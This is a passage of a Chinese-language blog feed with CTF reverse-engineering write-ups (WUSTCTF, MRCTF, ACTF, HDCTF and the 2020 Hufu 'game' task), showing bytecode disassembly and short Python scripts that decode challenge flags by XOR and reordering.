title="[WUSTCTF2020]level11"></a>[WUSTCTF2020]level11</h3><p><img src="../../img/image-20231226221722346.png" alt="image-20231226221722346"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>) </span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    tmp = f.readline()  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> tmp:</span><br><span class="line">        <span class="keyword">break</span>   </span><br><span class="line">    tmp=<span class="built_in">int</span>(tmp)   </span><br><span class="line">    <span class="keyword">if</span> i &amp; <span class="number">1</span>!= <span class="number">0</span> :</span><br><span class="line">        tmp=tmp&gt;&gt;i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp=tmp/i</span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(tmp)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="GUET-CTF2019-re1"><a href="#GUET-CTF2019-re1" class="headerlink" title="[GUET-CTF2019]re1"></a>[GUET-CTF2019]re1</h3><p>见z3求解器</p><h3 id="CrackRTF"><a href="#CrackRTF" class="headerlink" title="CrackRTF"></a>CrackRTF</h3><p>见CrackRTF</p><h3 id="MRCTF2020-Transform"><a href="#MRCTF2020-Transform" class="headerlink" title="[MRCTF2020]Transform"></a>[MRCTF2020]Transform</h3><p><img src="../../img/image-20231228225228337.png" alt="image-20231228225228337"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">byte_414040[i] ^= LOBYTE(dword_40F040[i]);</span><br></pre></td></tr></table></figure><p>LOBYTE，提取dowrd的低字节，即十六bit。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">key =[</span><br><span class="line">  <span class="number">0x09</span>,    <span class="number">0x0A</span>,    <span class="number">0x0F</span>,  </span><br><span class="line">    <span class="number">0x17</span>,    <span class="number">0x07</span>,    </span><br><span class="line">  <span class="number">0x18</span>,    <span class="number">0x0C</span>,    <span class="number">0x06</span>,  </span><br><span class="line">    <span class="number">0x01</span>,    <span class="number">0x10</span>,    </span><br><span class="line">  <span class="number">0x03</span>,    <span class="number">0x11</span>,    <span class="number">0x20</span>,  </span><br><span class="line">    <span class="number">0x1D</span>,    <span class="number">0x0B</span>,    </span><br><span class="line">  <span class="number">0x1E</span>,    <span class="number">0x1B</span>,    <span class="number">0x16</span>,  </span><br><span class="line">    <span class="number">0x04</span>,    <span class="number">0x0D</span>,    </span><br><span class="line">  <span class="number">0x13</span>,    <span class="number">0x14</span>,    <span class="number">0x15</span>,  </span><br><span class="line">    <span class="number">0x02</span>,    <span class="number">0x19</span>,    </span><br><span class="line">  <span class="number">0x05</span>,    <span class="number">0x1F</span>,    <span class="number">0x08</span>,  </span><br><span class="line">    <span class="number">0x12</span>,    <span class="number">0x1A</span>,    </span><br><span class="line">  <span class="number">0x1C</span>,    <span class="number">0x0E</span>,    <span class="number">0x0</span>  </span><br><span class="line">]<span class="comment">#转化为字符串，加上&#x27;\0&#x27;</span></span><br><span class="line">result=[</span><br><span class="line">  <span class="number">0x67</span>, <span class="number">0x79</span>, <span class="number">0x7B</span>, <span class="number">0x7F</span>, <span class="number">0x75</span>, <span class="number">0x2B</span>, <span class="number">0x3C</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x79</span>, </span><br><span class="line">  <span class="number">0x57</span>, <span class="number">0x5E</span>, <span class="number">0x5D</span>, <span class="number">0x42</span>, <span class="number">0x7B</span>, <span class="number">0x2D</span>, <span class="number">0x2A</span>, <span class="number">0x66</span>, <span class="number">0x42</span>, <span class="number">0x7E</span>, </span><br><span class="line">  <span class="number">0x4C</span>, <span class="number">0x57</span>, <span class="number">0x79</span>, <span class="number">0x41</span>, <span class="number">0x6B</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0x3C</span>, <span class="number">0x5C</span>, <span class="number">0x45</span>, </span><br><span class="line">  <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x4D</span>       ]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(key))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(result))</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(key[x]^result[x])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>但是这样输出的flag是乱序的<code>nsthr30TRiTO&#125;_p31pFs_ClCr&#123;z4N_sl</code>，我们再观察下函数,发现这是中括号，对输入进行了排列，且可以发现<code>dword_40F040</code>里的数据都是较小的。因此正确脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">key =[</span><br><span class="line">  <span class="number">0x09</span>,    <span class="number">0x0A</span>,    <span class="number">0x0F</span>,  </span><br><span class="line">    <span class="number">0x17</span>,    <span class="number">0x07</span>,    </span><br><span class="line">  <span class="number">0x18</span>,    <span class="number">0x0C</span>,    <span class="number">0x06</span>,  </span><br><span class="line">    <span class="number">0x01</span>,    <span class="number">0x10</span>,    </span><br><span class="line">  <span class="number">0x03</span>,    <span class="number">0x11</span>,    <span class="number">0x20</span>,  </span><br><span class="line">    <span class="number">0x1D</span>,    <span class="number">0x0B</span>,    </span><br><span class="line">  <span class="number">0x1E</span>,    <span class="number">0x1B</span>,    <span class="number">0x16</span>,  </span><br><span class="line">    <span class="number">0x04</span>,    <span class="number">0x0D</span>,    </span><br><span class="line">  <span class="number">0x13</span>,    <span class="number">0x14</span>,    <span class="number">0x15</span>,  </span><br><span class="line">    <span class="number">0x02</span>,    <span class="number">0x19</span>,    </span><br><span class="line">  <span class="number">0x05</span>,    <span class="number">0x1F</span>,    <span class="number">0x08</span>,  </span><br><span class="line">    <span class="number">0x12</span>,    <span class="number">0x1A</span>,    </span><br><span class="line">  <span class="number">0x1C</span>,    <span class="number">0x0E</span>,    <span class="number">0x0</span>  </span><br><span class="line">]<span class="comment">#转化为字符串，加上&#x27;\0&#x27;</span></span><br><span class="line">result=[</span><br><span class="line">  <span class="number">0x67</span>, <span class="number">0x79</span>, <span class="number">0x7B</span>, <span class="number">0x7F</span>, <span class="number">0x75</span>, <span class="number">0x2B</span>, <span class="number">0x3C</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x79</span>, </span><br><span class="line">  <span class="number">0x57</span>, <span class="number">0x5E</span>, <span class="number">0x5D</span>, <span class="number">0x42</span>, <span class="number">0x7B</span>, <span class="number">0x2D</span>, <span class="number">0x2A</span>, <span class="number">0x66</span>, <span class="number">0x42</span>, <span class="number">0x7E</span>, </span><br><span class="line">  <span class="number">0x4C</span>, <span class="number">0x57</span>, <span class="number">0x79</span>, <span class="number">0x41</span>, <span class="number">0x6B</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0x3C</span>, <span class="number">0x5C</span>, <span class="number">0x45</span>, </span><br><span class="line">  <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x4D</span>       ]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(key))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(result))</span><br><span class="line">flag=[<span class="number">0</span>]*<span class="number">33</span> </span><br><span class="line">tmp=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">33</span>):</span><br><span class="line">    tmp+=<span class="built_in">chr</span>(key[x]^result[x])</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">    flag[key[x]]=tmp[x]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-Xor"><a href="#MRCTF2020-Xor" class="headerlink" title="[MRCTF2020]Xor"></a>[MRCTF2020]Xor</h3><p><img src="../../img/image-20231230231925775.png" alt="image-20231230231925775"></p><p>找到地址为<code>401095</code>的call调用的函数，将其反汇编为c代码，然后就可以将main函数反汇编。无法直接F5的原因：1.反编译器无法确定调用约定（the decompiler could not determine the calling convention） 2. 反编译器无法确定参数个数和类型</p><p><img src="../../img/image-20240101231742951.png" alt="image-20240101231742951"></p><p>很简单的异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">key=<span class="string">&#x27;MSAWB~FXZ:J:`tQJ&quot;N@ bpdd&#125;8g&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">27</span>):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(i^<span class="built_in">ord</span>(key[i]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="ACTF新生赛2020-usualCrypt1"><a href="#ACTF新生赛2020-usualCrypt1" class="headerlink" title="[ACTF新生赛2020]usualCrypt1"></a>[ACTF新生赛2020]usualCrypt1</h3><p>换表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">key=<span class="string">&#x27;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&#x27;</span></span><br><span class="line">key=key.swapcase()</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line">base=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">base=<span class="built_in">list</span>(base)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">6</span>,<span class="number">15</span>):</span><br><span class="line">    tmp=base[i]</span><br><span class="line">    base[i]=base[i+<span class="number">10</span>]</span><br><span class="line">    base[i+<span class="number">10</span>]=tmp</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(base))</span><br></pre></td></tr></table></figure><p><img src="../../img/image-20240119225308383.png" alt="image-20240119225308383"></p><h3 id="HDCTF2019-Maze1"><a href="#HDCTF2019-Maze1" class="headerlink" title="[HDCTF2019]Maze1"></a>[HDCTF2019]Maze1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*******+**</span><br><span class="line">******* **</span><br><span class="line">****    **</span><br><span class="line">**   *****</span><br><span class="line">** **F****</span><br><span class="line">**    ****</span><br><span class="line">****</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-虎符网络安全赛道-Re-game</title>
      <link href="/2023/11/19/re/2020%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93-Re-game/"/>
      <url>/2023/11/19/re/2020%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93-Re-game/</url>
      
        <content type="html"><![CDATA[<p>题目链接<a href="https://pan.baidu.com/s/1Rq4lJmANHSL1EKk8AZxqDw?pwd=0422">https://pan.baidu.com/s/1Rq4lJmANHSL1EKk8AZxqDw?pwd=0422</a> </p><p>下载下来是一个txt文件，直接人工逆向分析。</p><h3 id="初始化及flag判断"><a href="#初始化及flag判断" class="headerlink" title="初始化及flag判断"></a>初始化及flag判断</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231120094102877.png" alt="image-20231120094102877"></p><p>前面容易看出初始化了三个列表arr0、arr1和arr2，python版本为2.7</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arr0 = [<span class="number">249</span>, <span class="number">91</span>, <span class="number">149</span>, <span class="number">113</span>, <span class="number">16</span>, <span class="number">91</span>, <span class="number">53</span>, <span class="number">41</span>]</span><br><span class="line">arr1 = [<span class="number">43</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">69</span>, <span class="number">20</span>, <span class="number">62</span>, <span class="number">6</span>, <span class="number">44</span>, <span class="number">24</span>, <span class="number">113</span>, <span class="number">6</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">44</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">127</span>, <span class="number">60</span>]</span><br><span class="line">arr2 = [<span class="number">90</span>, <span class="number">100</span>, <span class="number">87</span>, <span class="number">109</span>, <span class="number">86</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">105</span>, <span class="number">90</span>, <span class="number">104</span>, <span class="number">88</span>, <span class="number">102</span>]</span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231120100451027.png" alt="image-20231120100451027"></p><p>先声明四个check函数，然后是校验flag。由于每一次返回FALSE都是跳转到239偏移地址，flag错误。因此可以判断出四个check间是&amp;的关系。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="built_in">input</span>()</span><br><span class="line"><span class="keyword">if</span> check0(flag) &amp; check1(flag) &amp; check2(flag) &amp; check3(flag):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;no&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="check0"><a href="#check0" class="headerlink" title="check0"></a>check0</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># check0 line 5 of game.py</span><br><span class="line"></span><br><span class="line">   6       0  LOAD_GLOBAL           0  &#x27;all&#x27;</span><br><span class="line">           3  LOAD_GENEXPR             &#x27;&lt;code_object &lt;genexpr&gt;&gt;&#x27;</span><br><span class="line">           6  MAKE_FUNCTION_0       0  None</span><br><span class="line">           9  LOAD_FAST             0  &#x27;s&#x27;</span><br><span class="line">          12  GET_ITER</span><br><span class="line">          13  CALL_FUNCTION_1       1  None</span><br><span class="line">          16  CALL_FUNCTION_1       1  None</span><br><span class="line">          19  RETURN_VALUE</span><br><span class="line"># &lt;genexpr&gt; line 6 of game.py</span><br><span class="line"></span><br><span class="line">   6       0  LOAD_FAST             0  &#x27;.0&#x27;</span><br><span class="line">           3  FOR_ITER             32  &#x27;to 38&#x27;</span><br><span class="line">           6  STORE_FAST            1  &#x27;x&#x27;</span><br><span class="line">           9  LOAD_GLOBAL           0  &#x27;ord&#x27;</span><br><span class="line">          12  LOAD_FAST             1  &#x27;x&#x27;</span><br><span class="line">          15  CALL_FUNCTION_1       1  None</span><br><span class="line">          18  LOAD_GLOBAL           1  &#x27;range&#x27;</span><br><span class="line">          21  LOAD_CONST               32</span><br><span class="line">          24  LOAD_CONST               128</span><br><span class="line">          27  CALL_FUNCTION_2       2  None</span><br><span class="line">          30  COMPARE_OP            6  in</span><br><span class="line">          33  YIELD_VALUE</span><br><span class="line">          34  POP_TOP</span><br><span class="line">          35  JUMP_BACK             3  &#x27;to 3&#x27;</span><br><span class="line">          38  LOAD_CONST               None</span><br><span class="line">          41  RETURN_VALUE</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>创建一个生成器，对输入字符进行判断，输入字符ascii码范围为<font color=Red>32~128</font></p><p> <strong>all()</strong> 函数接受一个可迭代对象为参数，仅当可迭代对象中的所有项的计算结果为 True，或可迭代对象为空时才返回 True</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check0</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(<span class="built_in">ord</span>(x) <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>) <span class="keyword">for</span> x <span class="keyword">in</span> s)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="check1"><a href="#check1" class="headerlink" title="check1"></a>check1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># check1 line 8 of game.py</span><br><span class="line"></span><br><span class="line">   9       0  LOAD_GLOBAL           0  &#x27;len&#x27;</span><br><span class="line">           3  LOAD_FAST             0  &#x27;s&#x27;</span><br><span class="line">           6  CALL_FUNCTION_1       1  None</span><br><span class="line">           9  LOAD_CONST               100</span><br><span class="line">          12  COMPARE_OP            0  &lt;</span><br><span class="line">          15  POP_JUMP_IF_FALSE    58  &#x27;to 58&#x27;</span><br><span class="line">          18  LOAD_GLOBAL           0  &#x27;len&#x27;</span><br><span class="line">          21  LOAD_FAST             0  &#x27;s&#x27;</span><br><span class="line">          24  CALL_FUNCTION_1       1  None</span><br><span class="line">          27  LOAD_GLOBAL           0  &#x27;len&#x27;</span><br><span class="line">          30  LOAD_FAST             0  &#x27;s&#x27;</span><br><span class="line">          33  CALL_FUNCTION_1       1  None</span><br><span class="line">          36  BINARY_MULTIPLY</span><br><span class="line">          37  LOAD_CONST               777</span><br><span class="line">          40  BINARY_MODULO</span><br><span class="line">          41  LOAD_CONST               233</span><br><span class="line">          44  BINARY_XOR</span><br><span class="line">          45  LOAD_CONST               513</span><br><span class="line">          48  COMPARE_OP            2  ==</span><br><span class="line">        51_0  COME_FROM            15  &#x27;15&#x27;</span><br><span class="line">          51  POP_JUMP_IF_FALSE    58  &#x27;to 58&#x27;</span><br><span class="line"></span><br><span class="line">  10      54  LOAD_GLOBAL           1  &#x27;True&#x27;</span><br><span class="line">          57  RETURN_END_IF</span><br><span class="line">        58_0  COME_FROM            51  &#x27;51&#x27;</span><br><span class="line"></span><br><span class="line">  12      58  LOAD_GLOBAL           2  &#x27;False&#x27;</span><br><span class="line">          61  RETURN_VALUE</span><br><span class="line">          62  LOAD_CONST               None</span><br><span class="line">          65  RETURN_VALUE</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check1</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s) &lt; <span class="number">100</span> <span class="keyword">and</span> (((<span class="built_in">len</span>(s) * <span class="built_in">len</span>(s)) % <span class="number">777</span>) ^ <span class="number">233</span> == <span class="number">513</span>): </span><br><span class="line">        <span class="comment">#and 是逻辑与操作符。它用于连接两个布尔表达式，并在两者都为 True 时返回 True，否则返回 False。</span></span><br><span class="line">        <span class="comment">#&amp; 是按位与操作符。它用于对两个整数的每一位进行与运算。</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#check1</span></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">     len_s = sqrt(<span class="number">744</span>+<span class="number">777</span>*i)   <span class="comment">#744=513^233</span></span><br><span class="line">     <span class="keyword">if</span> (len_s%<span class="number">1</span>) == <span class="number">0</span> <span class="keyword">and</span> len_s &lt; <span class="number">100</span>:</span><br><span class="line">             <span class="built_in">print</span>(len_s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">if</span> x&lt;<span class="number">100</span> <span class="keyword">and</span> (x*x)%<span class="number">777</span>^<span class="number">233</span> == <span class="number">513</span>:</span><br><span class="line">        <span class="built_in">print</span>(x)</span><br><span class="line"><span class="comment">#得出字符串长度为39            两种破解方法</span></span><br></pre></td></tr></table></figure><h3 id="check2"><a href="#check2" class="headerlink" title="check2"></a>check2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"># check2 line 14 of game.py</span><br><span class="line"></span><br><span class="line">  15       0  LOAD_GLOBAL           0  &#x27;ord&#x27;</span><br><span class="line">           3  LOAD_FAST             0  &#x27;s&#x27;</span><br><span class="line">           6  LOAD_CONST               0</span><br><span class="line">           9  BINARY_SUBSCR</span><br><span class="line">          10  CALL_FUNCTION_1       1  None</span><br><span class="line">          13  LOAD_CONST               128</span><br><span class="line">          16  BINARY_MULTIPLY</span><br><span class="line">          17  LOAD_GLOBAL           0  &#x27;ord&#x27;</span><br><span class="line">          20  LOAD_FAST             0  &#x27;s&#x27;</span><br><span class="line">          23  LOAD_CONST               1</span><br><span class="line">          26  BINARY_SUBSCR</span><br><span class="line">          27  CALL_FUNCTION_1       1  None</span><br><span class="line">          30  BINARY_ADD</span><br><span class="line">          31  LOAD_CONST               128</span><br><span class="line">          34  BINARY_MULTIPLY</span><br><span class="line">          35  LOAD_GLOBAL           0  &#x27;ord&#x27;</span><br><span class="line">          38  LOAD_FAST             0  &#x27;s&#x27;</span><br><span class="line">          41  LOAD_CONST               2</span><br><span class="line">          44  BINARY_SUBSCR</span><br><span class="line">          45  CALL_FUNCTION_1       1  None</span><br><span class="line">          48  BINARY_ADD</span><br><span class="line">          49  LOAD_CONST               128</span><br><span class="line">          52  BINARY_MULTIPLY</span><br><span class="line">          53  LOAD_GLOBAL           0  &#x27;ord&#x27;</span><br><span class="line">          56  LOAD_FAST             0  &#x27;s&#x27;</span><br><span class="line">          59  LOAD_CONST               3</span><br><span class="line">          62  BINARY_SUBSCR</span><br><span class="line">          63  CALL_FUNCTION_1       1  None</span><br><span class="line">          66  BINARY_ADD</span><br><span class="line">          67  LOAD_CONST               128</span><br><span class="line">          70  BINARY_MULTIPLY</span><br><span class="line">          71  LOAD_GLOBAL           0  &#x27;ord&#x27;</span><br><span class="line">          74  LOAD_FAST             0  &#x27;s&#x27;</span><br><span class="line">          77  LOAD_CONST               4</span><br><span class="line">          80  BINARY_SUBSCR</span><br><span class="line">          81  CALL_FUNCTION_1       1  None</span><br><span class="line">          84  BINARY_ADD</span><br><span class="line">          85  LOAD_CONST               128</span><br><span class="line">          88  BINARY_MULTIPLY</span><br><span class="line">          89  LOAD_GLOBAL           0  &#x27;ord&#x27;</span><br><span class="line">          92  LOAD_FAST             0  &#x27;s&#x27;</span><br><span class="line">          95  LOAD_CONST               5</span><br><span class="line">          98  BINARY_SUBSCR</span><br><span class="line">          99  CALL_FUNCTION_1       1  None</span><br><span class="line">         102  BINARY_ADD</span><br><span class="line">         103  LOAD_CONST               3533889469877L</span><br><span class="line">         106  COMPARE_OP            2  ==</span><br><span class="line">         109  POP_JUMP_IF_FALSE   138  &#x27;to 138&#x27;</span><br><span class="line">         112  LOAD_GLOBAL           0  &#x27;ord&#x27;</span><br><span class="line">         115  LOAD_FAST             0  &#x27;s&#x27;</span><br><span class="line">         118  LOAD_CONST               -1</span><br><span class="line">         121  BINARY_SUBSCR</span><br><span class="line">         122  CALL_FUNCTION_1       1  None</span><br><span class="line">         125  LOAD_CONST               125</span><br><span class="line">         128  COMPARE_OP            2  ==</span><br><span 